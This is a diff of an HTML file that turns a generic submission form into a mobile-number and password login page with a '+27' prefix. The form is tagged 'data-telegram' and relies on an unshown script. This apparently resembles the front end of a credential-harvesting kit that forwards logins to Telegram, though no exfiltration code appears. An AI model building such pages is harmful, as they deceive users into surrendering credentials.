@@ -1,55 +1,49 @@
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>My Website</title>
-  <link rel="stylesheet" href="/style.css">
-</head>
-
-<body>
-
-  <div class="page-overlay">
-
-    <header class="navbar">
-      <div class="brand">YOUR BRAND</div>
-    </header>
-
-    <main class="login-modal">
-
-      <div class="modal-header">
-        <h2>Submit Details</h2>
-      </div>
-
-      <form id="accessForm" data-telegram>
-
-        <input
-          type="text"
-          name="username"
-          placeholder="Enter username"
-          required
-        >
-
-        <textarea
-          name="message"
-          placeholder="Enter your message"
-          required
-        ></textarea>
-
-        <button type="submit" class="login-btn">
-          SUBMIT
-        </button>
-
-        <p id="message" role="status"></p>
-
-      </form>
-
-    </main>
-
+<div class="page">
+  <div class="top-buttons">
+    <button type="button" class="nav-btn active">Login</button>
+    <button type="button" class="nav-btn">Sign Up</button>
   </div>
 
-  <script src="/script.js" defer></script>
+  <div class="login-modal">
+    <div class="modal-header">
+      <h2>Login</h2>
+      <button type="button" class="close-btn">×</button>
+    </div>
 
-</body>
-</html>
+    <form id="accessForm" data-telegram>
+      <div class="phone-field">
+        <span>+27</span>
+        <input
+          type="tel"
+          name="phone"
+          placeholder="Mobile Number"
+          autocomplete="tel"
+        >
+      </div>
+
+      <input
+        type="password"
+        id="password"
+        placeholder="Enter Password"
+        autocomplete="current-password"
+      >
+
+      <div class="forgot-links">
+        <a href="#">Forgot Username</a>
+        <a href="#">Forgot Password?</a>
+      </div>
+
+      <div class="signup-strip">
+        <span>Don't have an account yet?</span>
+        <a href="#">Sign Up ›</a>
+      </div>
+
+      <button type="submit" class="login-btn">Login</button>
+    </form>
+
+    <p id="message"></p>
+  </div>
+</div>
+
+<script src="/script.js" defer></script>
